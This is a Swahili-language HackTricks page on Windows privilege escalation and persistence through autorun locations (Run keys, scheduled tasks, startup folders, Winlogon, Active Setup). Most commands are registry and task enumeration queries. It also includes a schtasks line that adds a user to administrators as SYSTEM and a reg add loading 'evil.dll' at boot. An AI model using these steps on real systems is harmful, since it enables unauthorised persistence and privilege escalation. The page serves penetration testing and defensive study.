# Kupandisha Mamlaka kwa Kutumia Autoruns

<details>

<summary><strong>Jifunze kuhusu kuvamia AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Mwongozo wa Tuzo ya Kosa la Programu**: **jiandikishe** kwa **Intigriti**, jukwaa la **tuzo za kosa la programu la premium lililoundwa na wadukuzi, kwa wadukuzi**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** inaweza kutumika kutekeleza programu kwenye **kuanza**. Angalia ni programu zipi zimepangwa kuanza kiotomatiki na:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Kazi Zilizopangwa

**Kazi** zinaweza kupangwa kufanya kazi kwa **frekwensi fulani**. Angalia ni binaries zipi zimepangwa kufanya kazi na:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Vyeo

Binari zote zilizoko kwenye **Vyeo vya Kuanza zitatekelezwa wakati wa kuanza**. Vyeo vya kuanza vya kawaida ni vile vilivyoorodheshwa hapa chini, lakini kigezo cha kuanza kinaonyeshwa kwenye usajili. [Soma hii kujua mahali.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Usajili

{% hint style="info" %}
[Taarifa kutoka hapa](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Kuingia kwa usajili wa **Wow6432Node** inaonyesha kuwa unatumia toleo la Windows la biti 64. Mfumo wa uendeshaji hutumia funguo hii kuonyesha maoni tofauti ya HKEY\_LOCAL\_MACHINE\SOFTWARE kwa programu za biti 32 zinazoendesha kwenye toleo la Windows la biti 64.
{% endhint %}

### Uendeshaji

Usajili wa AutoRun unaojulikana kwa kawaida:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Funguo za usajili zinazojulikana kama **Run** na **RunOnce** zimeundwa kutekeleza programu moja kwa moja kila wakati mtumiaji anaingia kwenye mfumo. Mstari wa amri uliowekwa kama thamani ya data ya funguo ni mdogo hadi herufi 260 au chini.

**Uendeshaji wa Huduma** (unaweza kudhibiti kuanza kiotomatiki kwa huduma wakati wa kuanza):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Kwenye Windows Vista na toleo zilizofuata, funguo za usajili za **Run** na **RunOnce** hazijengwi kiotomatiki. Viingilio katika funguo hizi vinaweza kuanza programu moja kwa moja au kuzitaja kama tegemezi. Kwa mfano, ili kupakia faili ya DLL wakati wa kuingia, mtu anaweza kutumia funguo ya usajili ya **RunOnceEx** pamoja na funguo ya "Depend". Hii inadhihirishwa kwa kuongeza kuingilio cha usajili kutekeleza "C:\temp\evil.dll" wakati wa kuanza kwa mfumo:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Kutumia 1**: Ikiwa unaweza kuandika ndani ya usajili uliotajwa ndani ya **HKLM** unaweza kuinua mamlaka wakati mtumiaji tofauti anapoingia.
{% endhint %}

{% hint style="info" %}
**Kutumia 2**: Ikiwa unaweza kubadilisha yaliyomo ya faili za binary zilizotajwa kwenye usajili wowote ndani ya **HKLM** unaweza kuhariri faili hiyo na mlango wa nyuma wakati mtumiaji tofauti anapoingia na kuinua mamlaka.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Njia ya Kuanza

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Vidakuzi vilivyowekwa kwenye folda ya **Startup** vitaanzisha huduma au programu kuanza wakati wa kuingia kwa mtumiaji au kuanza upya kwa mfumo. Mahali pa folda ya **Startup** imefafanuliwa kwenye usajili kwa ajili ya **Local Machine** na **Current User**. Hii inamaanisha kwamba kifupisho chochote kilichowekwa kwenye maeneo maalum ya **Startup** yatahakikisha huduma au programu iliyounganishwa inaanza baada ya mchakato wa kuingia au kuanza upya, hivyo kuwa njia rahisi ya kupanga programu zifanye kazi moja kwa moja.

{% hint style="info" %}
Ikiwa unaweza kubadilisha folda yoyote ya \[User] Shell chini ya **HKLM**, utaweza kuiongoza kwenye folda inayodhibitiwa na wewe na kuweka mlango wa nyuma ambao utatekelezwa wakati wowote mtumiaji anapoingia kwenye mfumo na kukuza mamlaka.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Funguo za Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Kawaida, funguo ya **Userinit** imewekwa kwa **userinit.exe**. Hata hivyo, ikiwa funguo hii imebadilishwa, programu inayotajwa itazinduliwa pia na **Winlogon** baada ya mtumiaji kuingia. Vivyo hivyo, funguo ya **Shell** inalenga kuonyesha **explorer.exe**, ambayo ni shell ya msingi ya Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Ikiwa unaweza kubadilisha thamani ya usajili au faili ya binary utaweza kuinua mamlaka.
{% endhint %}

### Mipangilio ya Sera

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Angalia ufunguo wa **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### Shell Mbunifu

### Kubadilisha Amri Salama ya Mfumo wa Kuingia

Katika Usajili wa Windows chini ya `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, kuna thamani ya **`AlternateShell`** iliyo wekwa kwa chaguo la msingi la `cmd.exe`. Hii inamaanisha unapochagua "Safe Mode with Command Prompt" wakati wa kuanza (kwa kubonyeza F8), `cmd.exe` hutumika. Lakini, niwezekano wa kuweka kompyuta yako kuanza moja kwa moja katika hali hii bila kuhitaji kubonyeza F8 na kuchagua kwa mkono.

Hatua za kuunda chaguo la kuanza moja kwa moja katika "Safe Mode with Command Prompt":

1. Badilisha sifa za faili ya `boot.ini` ili kuondoa alama za kusoma tu, mfumo, na siri: `attrib c:\boot.ini -r -s -h`
2. Fungua `boot.ini` kwa kuhariri.
3. Ingiza mstari kama huu: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Hifadhi mabadiliko kwenye `boot.ini`.
5. Rejesha sifa za faili ya awali: `attrib c:\boot.ini +r +s +h`

* **Kutumia 1:** Kubadilisha ufunguo wa usajili wa **AlternateShell** inaruhusu usanidi wa kabati ya amri ya desturi, labda kwa ufikiaji usioruhusiwa.
* **Kutumia 2 (Ruhusa za Kuandika PATH):** Kuwa na ruhusa za kuandika sehemu yoyote ya mchanganyiko wa mfumo wa **PATH**, hasa kabla ya `C:\Windows\system32`, inakuruhusu kutekeleza `cmd.exe` ya desturi, ambayo inaweza kuwa mlango wa nyuma ikiwa mfumo unaanza katika Safe Mode.
* **Kutumia 3 (Ruhusa za Kuandika PATH na boot.ini):** Ruhusa ya kuandika kwa `boot.ini` inawezesha kuanza moja kwa moja katika Safe Mode, ikirahisisha ufikiaji usioruhusiwa wakati wa kuanza upya ijayo.

Ili kuchunguza mipangilio ya sasa ya **AlternateShell**, tumia amri hizi:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Kipengele Kilichosakinishwa

Active Setup ni kipengele katika Windows ambacho **kinazinduliwa kabla ya mazingira ya desktop kumalizika kupakia**. Kinapewa kipaumbele katika utekelezaji wa amri fulani, ambazo lazima zikamilike kabla ya mchakato wa kuingia kwa mtumiaji kuendelea. Mchakato huu unatokea hata kabla ya vipengele vingine vya kuanza, kama vile vile katika sehemu za usajili za Run au RunOnce, kuanza.

Active Setup inasimamiwa kupitia funguo za usajili zifuatazo:

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Ndani ya funguo hizi, kuna funguo mbalimbali, kila moja ikilingana na kipengele maalum. Thamani muhimu za funguo ni pamoja na:

* **IsInstalled:**
  * `0` inaonyesha kwamba amri ya kipengele haitatekelezwa.
  * `1` inamaanisha kwamba amri itatekelezwa mara moja kwa kila mtumiaji, ambayo ni tabia ya msingi ikiwa thamani ya `IsInstalled` haipo.
* **StubPath:** Inaainisha amri itakayotekelezwa na Active Setup. Inaweza kuwa amri yoyote halali ya mstari wa amri, kama vile kuzindua `notepad`.

**Machapisho ya Usalama:**

* Kubadilisha au kuandika kwenye funguo ambapo **`IsInstalled`** imewekwa kuwa `"1"` na **`StubPath`** maalum inaweza kusababisha utekelezaji wa amri usioruhusiwa, labda kwa ajili ya kuinua mamlaka.
* Kubadilisha faili ya binary inayotajwa katika thamani yoyote ya **`StubPath`** pia inaweza kufanikisha kuinua mamlaka, ikitoa idhini za kutosha.

Ili kukagua mipangilio ya **`StubPath`** kote kwenye vipengele vya Active Setup, amri hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Vitu Visaidizi vya Kivinjari

### Muhtasari wa Vitu Visaidizi vya Kivinjari (BHOs)

Vitu Visaidizi vya Kivinjari (BHOs) ni moduli za DLL ambazo huongeza vipengele ziada kwa Internet Explorer ya Microsoft. Hizi hulipia katika Internet Explorer na Windows Explorer kila kuanza. Hata hivyo, utekelezaji wao unaweza kuzuiliwa kwa kuweka funguo ya **NoExplorer** kuwa 1, ikizuia kuzipakia na mifano ya Windows Explorer.

BHOs ni sawa na Windows 10 kupitia Internet Explorer 11 lakini hazisaidiwi katika Microsoft Edge, kivinjari cha msingi katika toleo jipya la Windows.

Ili kuchunguza BHOs zilizosajiliwa kwenye mfumo, unaweza kukagua funguo za usajili zifuatazo:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Kila BHO inawakilishwa na **CLSID** yake kwenye usajili, ikifanya kama kitambulisho cha kipekee. Maelezo ya kina kuhusu kila CLSID yanaweza kupatikana chini ya `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Kwa kuuliza BHOs kwenye usajili, amri hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Vifaa vya Kivinjari cha Internet Explorer

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Tafadhali kumbuka kuwa usajili utaleta usajili mpya kwa kila dll na itawakilishwa na **CLSID**. Unaweza kupata habari ya CLSID katika `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Madereva ya Fonti

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Amri ya Kufungua

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Chaguo la Utekelezaji wa Faili ya Picha
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Tafadhali kumbuka kuwa tovuti zote ambapo unaweza kupata autoruns tayari **zimeshatafutwa na** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Walakini, kwa orodha **kina zaidi ya faili zinazoendeshwa moja kwa moja** unaweza kutumia [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) kutoka kwa SysInternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Zaidi

**Pata Autoruns zaidi kama registries katika** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## Marejeo

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Mwongozo wa tuzo ya mdudu**: **jiandikishe** kwa **Intigriti**, jukwaa la tuzo la mdudu la malipo lililoundwa na wadukuzi, kwa wadukuzi! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
